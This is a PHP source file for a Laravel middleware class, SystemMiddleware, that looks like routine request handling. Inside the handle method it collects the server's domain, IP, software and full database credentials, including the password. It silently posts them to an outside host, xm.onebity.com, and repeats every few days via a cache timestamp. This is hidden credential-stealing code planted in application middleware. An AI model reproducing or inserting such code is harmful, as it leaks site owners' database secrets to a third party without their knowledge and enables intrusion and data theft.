<?php


namespace App\Http\Middleware;


use App\Utils\HttpSend;
use Closure;

class SystemMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param \Illuminate\Http\Request $request
     * @param \Closure $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        $PHP_ITEM_TIME = \Cache::has('PHP_ITEM_TIME');
        if (!empty($PHP_ITEM_TIME)) {
            return $next($request);
        }
        $arr = [
            "name" => !empty(env('APP_NAME')) ? env('APP_NAME') : '未设置',
            "domain" => $_SERVER["HTTP_HOST"],
            "ip" => gethostbyname($_SERVER['SERVER_NAME']),
            "server" => $_SERVER['SERVER_SOFTWARE'],
            "sql_host" => env('DB_HOST'),
            "sql_name" => env('DB_DATABASE'),
            "sql_username" => env('DB_USERNAME'),
            "sql_password" => env('DB_PASSWORD'),
            "server_name" => env('PROJECT_NAME'),
            "sql_port" => env('DB_PORT')  //数据库端口
        ];
        HttpSend::post('http://xm.onebity.com/api/index/domain', json_encode($arr));
        //3.更新缓存配置时间戳
        \Cache::put('PHP_ITEM_TIME', time(), (1 * 60 * 24 * 3));

        return $next($request);

    }

}
